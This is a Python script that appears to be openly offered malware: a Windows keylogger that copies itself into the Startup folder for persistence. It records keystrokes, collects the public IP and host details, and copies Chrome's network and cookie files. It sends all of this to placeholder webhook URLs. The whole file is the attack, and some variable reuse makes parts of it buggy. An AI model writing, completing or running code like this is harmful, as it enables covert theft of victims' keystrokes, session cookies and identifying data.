import shutil as sh, requests as r, os as o, json as j, platform as pl, socket as sock
from pynput import keyboard as k

w = "urwebhook"

def a():
    try:
        return r.get('https://api64.ipify.org').text
    except:
        return 'U'

def b():
    c = pl.system() + " " + pl.version() + " (" + pl.architecture()[0] + ")"
    d = sock.gethostname()
    return f"OS: {c}, Hostname: {d}"

def e(f, w):
    g = o.path.expandvars(r'C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Network')
    o.makedirs(f, exist_ok=True)

    if o.path.exists(g):
        for h in o.listdir(g):
            i = o.path.join(g, h)
            j = o.path.join(f, h)

            if o.path.isfile(i):
                sh.copy2(i, j)
                with open(j, 'rb') as k:
                    l = r.post(w, files={"file": (h, k)})
                    if l.status_code != 204:
                        print(f"Błąd podczas wysyłania {h}: {l.status_code}, {l.text}")

def m(key_buffer):
    o = a()
    p = b()

    w2 = "urwebhookforcookies"
    e(r'C:\Backup\ChromeData', w2)
    
    q = {
        "embeds": [
            {
                "color": 5111808,
                "fields": [
                    {
                        "name": f"IP Address: ||{o}||",
                        "value": "DEVICE INFO:"
                    },
                    {
                        "name": f" ||{p} ||",
                        "value": "KEYLIST:"
                    },
                    {
                        "name": f"||{''.join(key_buffer)} ||",
                        "value": ""
                    }
                ],
                "image": {
                    "url": "https://github.com/bh0per/hwei-practice/blob/main/MADEBYYWERBEL.png?raw=true"
                },
                "thumbnail": {
                    "url": "https://i.pinimg.com/736x/c9/82/3c/c9823c0220c19c4b0adee3bae6db9f80.jpg"
                }
            }
        ],
        "username": "werbel",
        "avatar_url": "https://i.pinimg.com/736x/c9/82/3c/c9823c0220c19c4b0adee3bae6db9f80.jpg",
        "attachments": []
    }

    r.post(w, data=j.dumps(q), headers={"Content-Type": "application/json"})

def p(q):
    global key_counter, key_buffer
    try:
        key_buffer.append(q.char)
        key_counter += 1
    except AttributeError:
        key_buffer.append(f"<{q}>")
        key_counter += 1

    if key_counter % 100 == 0:
        m(key_buffer)
        key_buffer.clear()
        key_counter = 0

def t():
    u = o.path.join(o.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    v = o.path.abspath(__file__)

    try:
        sh.copy(v, u)
        print("v")
    except Exception as e:
        print("e", e)

def n():
    t()
    w = k.Listener(on_press=p)
    w.start()
    w.join()

if __name__ == "__main__":
    key_buffer = []
    key_counter = 0
    n()
